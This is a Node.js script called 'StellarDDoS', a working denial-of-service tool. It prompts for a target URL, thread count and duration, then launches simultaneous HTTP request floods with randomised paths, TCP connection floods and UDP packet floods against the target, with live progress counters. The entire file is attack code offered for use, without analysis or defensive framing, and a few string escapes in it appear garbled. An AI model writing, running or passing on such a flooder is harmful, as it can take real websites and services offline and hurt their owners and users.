#!/usr/bin/env node 'use strict';

const net = require('net'); const dgram = require('dgram'); const http = require('http'); const https = require('https'); const { performance } = require('perf_hooks'); const readline = require('readline'); const chalk = require('chalk');

class StellarDDoS { constructor() { this.stats = { totalRequests: 0, success: 0, failed: 0, startTime: 0 }; this.isRunning = false; this.animationChars = ['|', '/', '-', '\']; this.animationIndex = 0; }

startAttack(target, options = {}) {
    if (this.isRunning) return;
    const threads = options.threads || 200;
    const duration = options.duration || 30;
    const protocol = target.startsWith('https') ? https : http;
    const url = new URL(target);
    this.isRunning = true;
    this.stats.startTime = performance.now();

    this.agent = new protocol.Agent({ keepAlive: true, maxSockets: threads * 500 });

    this.udpSocket = dgram.createSocket('udp4');
    this.udpSocket.on('error', () => {});

    this.showStatsInterval = setInterval(() => this.showStats(), 10);
    this.animationInterval = setInterval(() => this.updateAnimation(), 10);

    for (let i = 0; i < threads * 100; i++) this.createConnection(protocol, url);
    for (let i = 0; i < threads * 100; i++) this.tcpFlood(url);
    for (let i = 0; i < threads * 50; i++) this.udpFlood(url);

    setTimeout(() => this.stopAttack(), duration * 1000);
}

createConnection(protocol, url) {
    if (!this.isRunning) return;
    const req = protocol.request({
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + '?' + Math.random().toString(36).slice(2),
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0', Connection: 'keep-alive' },
        agent: this.agent
    }, res => {
        res.on('data', () => {});
        res.on('end', () => this.onSuccess());
    });
    req.on('error', () => this.onFail());
    for (let i = 0; i < 100; i++) {
        req.write(
            `GET ${url.pathname}?${Math.random().toString(36).slice(2)} HTTP/1.1\r

Host: ${url.hostname}\r Connection: keep-alive\r \r ` ); } req.setTimeout(1000, () => req.destroy()); req.end(); }

tcpFlood(url) {
    if (!this.isRunning) return;
    const sock = net.connect({ host: url.hostname, port: url.port || 80 }, () => {
        this.onSuccess();
        sock.destroy();
        if (this.isRunning) this.tcpFlood(url);
    });
    sock.on('error', () => {
        this.onFail();
        if (this.isRunning) this.tcpFlood(url);
    });
}

udpFlood(url) {
    if (!this.isRunning) return;
    const msg = Buffer.alloc(2048);
    this.udpSocket.send(msg, url.port || 80, url.hostname, err => {
        if (err) this.onFail(); else this.onSuccess();
        if (this.isRunning) this.udpFlood(url);
    });
}

onSuccess() {
    this.stats.success++;
    this.stats.totalRequests++;
    process.stdout.write(chalk.green('.'));
}

onFail() {
    this.stats.failed++;
    this.stats.totalRequests++;
    process.stdout.write(chalk.red('x'));
}

showStats() {
    const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    const char = this.animationChars[this.animationIndex];
    process.stdout.write(
        `\r${chalk.greenBright(char)} ${elapsed}s | R:${this.stats.totalRequests} | ` +
        `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`
    );
}

updateAnimation() {
    this.animationIndex = (this.animationIndex + 1) % this.animationChars.length;
}

stopAttack() {
    if (!this.isRunning) return;
    clearInterval(this.showStatsInterval);
    clearInterval(this.animationInterval);
    this.udpSocket.close();
    const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    console.log(chalk.green(`\nAttack completed in ${elapsed}s`));
    console.log(chalk.blue(`Total: ${this.stats.totalRequests}`));
    console.log(chalk.green(`${this.stats.success} success`) + ' | ' + chalk.red(`${this.stats.failed} failed`));
    process.exit(0);
}

}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const stellar = new StellarDDoS(); rl.question(chalk.greenBright('Target URL: '), target => { rl.question(chalk.greenBright('Threads (200): '), threads => { rl.question(chalk.greenBright('Duration (30s): '), duration => { stellar.startAttack(target, { threads: parseInt(threads) || 200, duration: parseInt(duration) || 30 }); rl.on('line', line => { if (line.trim() === 'stop') { stellar.stopAttack(); rl.close(); } }); }); }); }); rl.on('close', () => stellar.stopAttack());

